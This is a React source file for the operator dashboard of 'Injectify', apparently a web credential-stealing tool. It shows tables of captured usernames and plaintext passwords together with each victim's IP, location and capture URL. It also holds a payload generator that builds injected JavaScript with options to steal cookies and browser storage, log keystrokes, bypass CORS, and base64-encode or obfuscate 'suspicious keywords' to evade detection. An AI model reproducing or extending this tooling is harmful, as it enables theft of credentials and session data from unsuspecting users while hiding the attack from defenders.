import ReactDOM, { render } from 'react-dom'
import React, { Component } from "react";
import Request from 'react-http-request';
import PropTypes from 'prop-types';
import { withStyles } from 'material-ui/styles';
import classNames from 'classnames';
import Drawer from 'material-ui/Drawer';
import AppBar from 'material-ui/AppBar';
import Toolbar from 'material-ui/Toolbar';
import List, { ListItem, ListItemIcon, ListItemText } from 'material-ui/List';
import { MenuItem } from 'material-ui/Menu';
import url from 'url';
import Typography from 'material-ui/Typography';
import TextField from 'material-ui/TextField';
import Divider from 'material-ui/Divider';
import IconButton from 'material-ui/IconButton';
import MenuIcon from 'material-ui-icons/Menu';
import ChevronLeftIcon from 'material-ui-icons/ChevronLeft';
import ChevronRightIcon from 'material-ui-icons/ChevronRight';
import Button from 'material-ui/Button';
import Avatar from 'material-ui/Avatar';
import Tooltip from 'material-ui/Tooltip';
import Timestamp from 'react-timestamp';
import ListSubheader from 'material-ui/List/ListSubheader';
import SettingsIcon from 'material-ui-icons/Settings';
import Paper from 'material-ui/Paper';
import { LinearProgress } from 'material-ui/Progress';
import AddIcon from 'material-ui-icons/Add';
import CloseIcon from 'material-ui-icons/Close';
import { CircularProgress } from 'material-ui/Progress';
import Slide from 'material-ui/transitions/Slide';
import ReactJson from 'react-json-view';
import {CopyToClipboard} from 'react-copy-to-clipboard';
import { FormControlLabel, FormGroup } from 'material-ui/Form';
import SyntaxHighlighter from 'react-syntax-highlighter';
import { atomOneDark } from 'react-syntax-highlighter/styles/hljs';
import { indigo } from 'material-ui/colors';
import Switch from 'material-ui/Switch';
import Dialog, {
	DialogActions,
	DialogContent,
	DialogContentText,
	DialogTitle,
} from 'material-ui/Dialog';
import Table, { TableBody, TableCell, TableHead, TableRow } from 'material-ui/Table';

let drawerWidth = 240

function Transition(props) {
  return <Slide direction="up" {...props} />;
}

const styles = theme => ({
  root: {
    width: '100%',
    height: '100%',
    zIndex: 1,
    overflow: 'hidden',
  },
  appFrame: {
    position: 'relative',
    display: 'flex',
    width: '100%',
    height: '100%',
  },
  flex: {
    flex: 1,
  },
  appBar: {
    position: 'absolute',
    transition: theme.transitions.create(['margin', 'width'], {
      easing: theme.transitions.easing.sharp,
      duration: theme.transitions.duration.leavingScreen,
    }),
  },
  noshadow: {
    boxShadow: 'none',
  },
  loading : {
    top: 64,
    width: '100%',
    position: 'absolute',
  },
  '@media (min-width: 700px)': {
    appBarShift: {
      width: `calc(100% - ${drawerWidth}px)`,
      transition: theme.transitions.create(['margin', 'width'], {
        easing: theme.transitions.easing.easeOut,
        duration: theme.transitions.duration.enteringScreen,
      }),
      marginLeft: drawerWidth,
    },
  },
  newProject: {
    position: 'absolute',
    bottom: 15,
    right: 15,
  },
  toolbar: {
    minHeight: 64,
  },
  appBarHeader: {
    flex: '1',
    cursor: 'pointer',
    userSelect: 'none',
  },
  avatar: {
    width: 35,
    height: 35,
    marginLeft: 8,
  },
  menuButton: {
    marginLeft: 12,
    marginRight: 20,
  },
  recordContent: {
    paddingTop: 75,
  },
  hide: {
    display: 'none',
  },
  drawerPaper: {
    position: 'relative',
    height: '100%',
    width: drawerWidth,
  },
  drawerHeader: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'flex-end',
    padding: '0 8px',
    ...theme.mixins.toolbar,
  },
  content: {
    width: '100%',
    flexGrow: 1,
    backgroundColor: theme.palette.background.default,
    marginLeft: -drawerWidth,
    padding: theme.spacing.unit * 3,
    transition: theme.transitions.create('margin', {
      easing: theme.transitions.easing.sharp,
      duration: theme.transitions.duration.leavingScreen,
    }),
    height: 'calc(100% - 96px)',
    overflow: 'scroll',
    marginTop: 64,
    [theme.breakpoints.up('sm')]: {
      content: {
        height: 'calc(100% - 64px)',
        marginTop: 64,
      },
    },
  },
  '@media (max-width: 699px)': {
    content: {
      marginLeft: 0,
    },
    drawerPaper: {
      flex: 'none',
      width: '256px !important',
    },
  },
  contentShift: {
    transition: theme.transitions.create('margin', {
      easing: theme.transitions.easing.easeOut,
      duration: theme.transitions.duration.enteringScreen,
    }),
    marginLeft: 0,
  },
  paper: {
    display: 'inline-block',
    minWidth: '100%',
  },
  tableCell: {
    padding: '4px 25px',
  },
  center: {
    textAlign: 'center',
  },
  '@media (max-width: 500px)': {
    content: {
      padding: theme.spacing.unit * 3 + "px " + theme.spacing.unit + "px",
    },
    tableCell: {
      padding: '4px 15px',
    }
  },
  '@media (max-width: 400px)': {
    content: {
      padding: theme.spacing.unit * 2 + "px " + theme.spacing.unit * .5 + "px",
    },
    tableCell: {
      padding: '4px 5px',
      textAlign: 'center',
    }
  },
  code: {
    whiteSpace: 'pre-wrap',
    wordWrap: 'break-word',
    maxHeight: '100%',
    padding: '0.5em 1em !important',
  },
  codeDialog: {
    background: '#282C34',
  },
  transparent: {
    background: 'none !important',
    boxShadow: 'none !important',
    overflow: 'hidden !important',
  },
})

class PersistentDrawer extends Component {
  state = {
    open: false,
    recordOpen: false,
    currentProject: null,
    loading: false,
  };

  componentWillReceiveProps(nextProps) {
    if (nextProps.parentState.user.login !== this.props.parentState.user.login && this.props.parentState.width >= 700) {
      if (nextProps.parentState.user.login) {
        this.setState({ open: true })
      } else {
        this.setState({ open: false })
      }
    }
    if (nextProps.parentState.project !== this.props.parentState.project) {
      this.loading(false)
      this.setState({ currentProject: nextProps.parentState.project})
    }
  }

  handleDrawerOpen = () => {
    this.setState({ open: true })
  }

  handleDrawerClose = () => {
    this.setState({ open: false })
  }

  handleRecordOpen = (record) => {
    this.setState({
      recordOpen: true,
      record: record
    })
  };

  handleRecordClose = () => {
    this.setState({ recordOpen: false });
  };

  returnHome = () => {
    this.setState({ currentProject: null })
    this.props.emit("project:close")
    window.history.pushState('', 'Injectify', '/')
    document.getElementsByTagName('title')[0].innerHTML = 'Injectify'
  }

  loading = value => {
    this.setState({
      loading: value
    })
  }

  signOut = () => {
    this.returnHome()
    this.props.signOut()
  }

	viewJSON = () => {
		window.open("/api/" + encodeURIComponent(this.props.token) + "/" + encodeURIComponent(this.state.currentProject.name) /*+ "&download=true"*/)
  }

  render() {
    const { classes, theme, signIn } = this.props;
    const { open } = this.state;

    return (
      <div className={classes.root}>
        <div className={classes.appFrame}>
          <AppBar
            className={`${classNames(classes.appBar, {
              [classes.appBarShift]: open,
            })} ${this.state.loading ? classes.noshadow : ""}`}
          >
            <Toolbar className={classes.toolbar}>
              <IconButton
                color="contrast"
                aria-label="open drawer"
                onClick={this.handleDrawerOpen}
                className={classNames(classes.menuButton, open && classes.hide)}
              >
                <MenuIcon />
              </IconButton>
              <Typography type="title" color="inherit" noWrap className={classes.appBarHeader} onClick={this.returnHome.bind(this)}>
                  Injectify
              </Typography>
              {this.props.parentState.user.login ? (
                  <Tooltip title="Log out" placement="bottom">
                    <Button color="contrast" onClick={this.signOut} className="signed-in">
                      {this.props.parentState.user.login}
                      <Avatar src={`${this.props.parentState.user.avatar_url}&s=40`} className={classes.avatar}/>
                    </Button>
                  </Tooltip>
                ) : (
                  <Button color="contrast" onClick={signIn} autoFocus>
                    Login with GitHub
                  </Button>
                )
              }
            </Toolbar>
          </AppBar>
          {this.state.loading ? (<LinearProgress className={classes.loading} /> ) : null}
          <Drawer
            type={this.props.parentState.width >= 700 ? "persistent" : ''}
            classes={{
              paper: classes.drawerPaper,
            }}
            open={open}
            onRequestClose={this.handleDrawerClose.bind(this)}
          >
            <div className={classes.drawerInner}>
              <div className={classes.drawerHeader}>
                <IconButton onClick={this.handleDrawerClose}>
                  {theme.direction === 'rtl' ? <ChevronRightIcon /> : <ChevronLeftIcon />}
                </IconButton>
              </div>
              <ProjectList p={this.props} projects={this.props.parentState.projects} projectData={this.props.parentState.project} emit={this.props.emit} classes={classes} token={this.props.token} loading={this.loading.bind(this)} closeDrawer={this.handleDrawerClose.bind(this)}/>
            </div>
          </Drawer>
          {this.state.currentProject ? (
                <main
                  className={classNames(classes.content, classes[`content`], {
                    [classes.contentShift]: open,
                  })}
                >
                  <Paper className={classes.paper}>
                    <Table>
                      <TableHead>
                        <TableRow>
                          <TableCell className={classes.tableCell}>
                            Time
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            Username
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            Password
                          </TableCell>
                          <TableCell className={`${classes.tableCell} ${classes.center}`} width={64}>
                            Details
                          </TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {this.state.currentProject.passwords.map((record, i) => {
                          return (
                            <TableRow key={i}>
                              <TableCell className={classes.tableCell}>
                                <Timestamp
                                  time={record.timestamp}
                                  format='ago'
                                  precision={this.props.parentState.width > 600 ? 2 : 1}
                                />
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {record.username}
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {record.password}
                              </TableCell>
                              <TableCell className={classes.tableCell} numeric>
                                <Tooltip
                                  title={
                                    <span>
                                      {record.url.href && url.parse(record.url.href).hostname && record.url.title ? (
                                        <span>
                                          {url.parse(record.url.href).hostname} ({record.url.title})
                                          <br/>
                                        </span>
                                      ) : null}
                                      {record.ip.query && record.ip.country ? (
                                        <span>
                                          {record.ip.query} ({record.ip.country})
                                          <br/>
                                        </span>
                                      ) : null}
                                    </span>
                                  }
                                  placement="left"
                                  disableTriggerFocus
                                  disableTriggerTouch
                                >
                                  <Button color="primary" dense onClick={() => {this.handleRecordOpen(record)}}>
                                    More
                                  </Button>
                                </Tooltip>
                              </TableCell>
                            </TableRow>
                          )
                        })}
                        <tr ref={el => this.tableEnd = el} className="tableEnd"></tr>
                      </TableBody>
                    </Table>
                  </Paper>
                  <br />
                  <Javascript parentState={this.state} notify={this.props.notify} classes={classes} />
                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
                    <Button onClick={this.viewJSON} color="primary">
                      View JSON
                    </Button>
                  </Tooltip>
                  <Tooltip title="New project" placement="left">
                    <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
                      <AddIcon />
                    </Button>
                  </Tooltip>
                  {this.state.recordOpen ? (
                    <Dialog
                      fullScreen
                      open={this.state.recordOpen}
                      onRequestClose={this.handleRecordClose}
                      transition={Transition}
                    >
                      <AppBar>
                        <Toolbar>
                          <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
                            <CloseIcon />
                          </IconButton>
                          <Typography type="title" color="inherit" className={classes.flex}>
                            Record for {this.state.currentProject.name}
                          </Typography>
                          {/* <Button color="contrast" onClick={this.handleRecordClose}>
                            save
                          </Button> */}
                        </Toolbar>
                      </AppBar>
                      <List className={classes.recordContent}>
                        <CopyToClipboard text={this.state.record.timestamp}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.timestamp
                          })}>
                          <ListItem button>
                            <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        <CopyToClipboard text={this.state.record.username}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.username
                          })}>
                          <ListItem button>
                            <ListItemText primary="Username" secondary={this.state.record.username} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        <CopyToClipboard text={this.state.record.password}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.password
                          })}>
                          <ListItem button>
                            <ListItemText primary="Password" secondary={this.state.record.password} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        <ListItem button onClick={() => {window.open(this.state.record.url.href).bind}}>
                          <ListItemText primary="Capture URL" secondary={this.state.record.url.href} />
                        </ListItem>
                        <Divider />
                        <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
                          <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
                        </ListItem>
                        <Divider />
                        <CopyToClipboard text={`${this.state.record.browser.height}x${this.state.record.browser.width}px`}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.browser.height + "x" + this.state.record.browser.width + "px"
                          })}>
                          <ListItem button>
                            <ListItemText primary="Screen resolution" secondary={`${this.state.record.browser.height}x${this.state.record.browser.width}px`} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        <br />
                        <ListItem>
                          <ReactJson src={this.state.record} />
                        </ListItem>
                      </List>
                    </Dialog>
                    ) : null
                  }
                </main>
              ) : (
                <main
                  className={classNames(classes.content, classes[`content`], {
                    [classes.contentShift]: open,
                  })}
                >
                  {this.props.children}
                  <Tooltip title="New project" placement="left">
                    <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
                      <AddIcon />
                    </Button>
                  </Tooltip>
                </main>
            )
          }
        </div>
      </div>
    )
  }
}

class ProjectList extends Component {
	render() {
    const { classes, theme } = this.props;
		if (this.props.projects && this.props.projects[0]) {
			return (
        <div>
          <List className={classes.list} subheader={<ListSubheader>My account</ListSubheader>}>
            <ListItem button>
              <ListItemIcon>
                <SettingsIcon />
              </ListItemIcon>
              <ListItemText primary="Configuration" />
            </ListItem>
          </List>
          <Divider />
          <List className={classes.list} subheader={<ListSubheader>My projects</ListSubheader>}>
            {this.props.projects.map((project, i) =>
              <Project raised color="primary" key={i} record={project.name} p={this.props} />
            )}
          </List>
        </div>
			)
		} else {
			return null
		}
	}
}

class Project extends Component {
	handleClickOpen = (a) => {
    if(this.props.p.p.parentState.width <= 700) this.props.p.closeDrawer()
    this.props.p.emit("project:close", {
			name: this.props.record
		})
		this.props.p.emit("project:read", {
			name: this.props.record
    })
    this.props.p.loading(true)
    window.history.pushState('', this.props.record + ' - Injectify', '/projects/' + encodeURIComponent(this.props.record))
	}

	render() {
		return (
      <ListItem button onClick={this.handleClickOpen} className={this.props.p.projectData && this.props.p.projectData.name == this.props.record ? "active" : null}>
        <ListItemText primary={this.props.record} />
      </ListItem>
		)
	}
}

class Javascript extends Component {
  state = {
    open: false,
    javascriptURL: false,
    options: {
      cookies: true,
      sessionStorage: true,
      localStorage: true,
      keylogger: false,
      minify: true,
      obfuscate: false,
      base64: true,
      bypassCors: false,
    }
  }

  handleClickOpen = () => {
    this.setState({ open: true })
  }

  handleRequestClose = () => {
    this.setState({
      open: false
    })
    setTimeout(() => {
      this.setState({
        javascriptURL: false
      })
    }, 300)
  }

  componentWillMount() {
    let savedOptions
    try {
      savedOptions = JSON.parse(localStorage.getItem("payload-generator"))
    } catch(e) {
      localStorage.setItem("payload-generator", '')
      return
    }
    if (savedOptions) {
      this.setState({ options: savedOptions})
    }
  }

  viewJS = () => {
    let params = ''
    if (this.state.options.cookies == false) params += "&cookies=false"
    if (this.state.options.localStorage == false) params += "&localStorage=false"
    if (this.state.options.sessionStorage == false) params += "&sessionStorage=false"
    if (this.state.options.keylogger == true) params += "&keylogger=true"
    if (this.state.options.minify == true) params += "&minify=true"
    if (this.state.options.obfuscate == true) params += "&obfuscate=true"
    if (this.state.options.base64 == false) params += "&base64=false"
    if (this.state.options.bypassCors == true) params += "&bypassCors=true"
    this.setState({
      javascriptURL: "/payload/?project=" + encodeURIComponent(this.props.parentState.currentProject.name) + params
    })
    localStorage.setItem("payload-generator", JSON.stringify(this.state.options))
  }

  back = () => {
    this.setState({
      javascriptURL: false
    })
  }

  raw = () => {
    window.open(this.state.javascriptURL, '_blank')
  }

  render() {
    return (
      <div>
        <Tooltip title="Payload for this project" placement="bottom">
          <Button onClick={this.handleClickOpen} color="primary">
            Javascript code
          </Button>
        </Tooltip>  
          {this.state.javascriptURL ? (
            <div>              
              <Request
                url={this.state.javascriptURL}
                method='get'
                verbose={true}
              >
                {
                  ({error, result, loading}) => {
                    if (loading) {
                      return (
                        <Dialog open={this.state.open} classes={{ paper: this.props.classes.transparent }}>
                          <CircularProgress size={60} style={{ color: indigo[50] }} />
                        </Dialog>
                      )
                    } else {
                      return (
                        <div>
                          <Dialog open={this.state.open} onRequestClose={this.handleRequestClose} classes={{ paper: this.props.classes.codeDialog}}>
                            <SyntaxHighlighter showLineNumbers language='javascript' style={atomOneDark} height={200} className={this.props.classes.code}>
                              {result.text}
                            </SyntaxHighlighter>
                            <DialogActions>
                              <Button onClick={this.back.bind(this)} color="contrast">
                                Back
                              </Button>
                              <Button onClick={this.raw.bind(this)} color="contrast">
                                Raw
                              </Button>
                              <CopyToClipboard text={result.text}
                                onCopy={() => this.props.notify({
                                  title: "Copied to clipboard!",
                                  message: "Try testing it in DevTools"
                              })}>
                                <Button color="contrast">
                                  Copy
                                </Button>
                              </CopyToClipboard>
                            </DialogActions>
                          </Dialog>
                        </div>
                      )
                    }
                  }
                }
              </Request>
            </div>
          ) : (
            <Dialog open={this.state.open} onRequestClose={this.handleRequestClose}>
              <DialogTitle>Payload generator</DialogTitle>
              <DialogContent>
                <DialogContentText>
                  Select the options you want your payload to have / not have
                </DialogContentText>
                <FormGroup>
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.keylogger}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, keylogger: checked } } )}
                      />
                    }
                    label="Record keystrokes (keylogger)"
                  />
                  <Divider inset />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.sessionStorage}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, sessionStorage: checked } } )}
                      />
                    }
                    label="Capture session storage"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.localStorage}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, localStorage: checked } } )}
                      />
                    }
                    label="Capture local storage"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.cookies}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, cookies: checked } } )}
                      />
                    }
                    label="Capture browser cookies"
                  />
                  <Divider inset />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.bypassCors}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, bypassCors: checked } } )}
                      />
                    }
                    label="Bypass CORS - redirects page"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.base64}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, base64: checked } } )}
                      />
                    }
                    label="Base64 encode suspicious keywords"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.minify}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, minify: checked } } )}
                      />
                    }
                    label="Minify outputted javascript"
                  />
                  <FormControlLabel
                    control={
                      <Switch
                        checked={this.state.options.obfuscate}
                        onChange={(event, checked) => this.setState({ options: { ...this.state.options, obfuscate: checked } } )}
                      />
                    }
                    label="Obfuscate outputted javascript"
                  />
                </FormGroup>
              </DialogContent>
              <DialogActions>
                <Button onClick={this.handleRequestClose} color="primary">
                  Cancel
                </Button>
                <Button onClick={this.viewJS} color="primary">
                  Generate
                </Button>
              </DialogActions>
            </Dialog>
          )}
      </div>
    )
  }
}

PersistentDrawer.propTypes = {
  classes: PropTypes.object.isRequired,
  theme: PropTypes.object.isRequired,
};

export default withStyles(styles, { withTheme: true })(PersistentDrawer);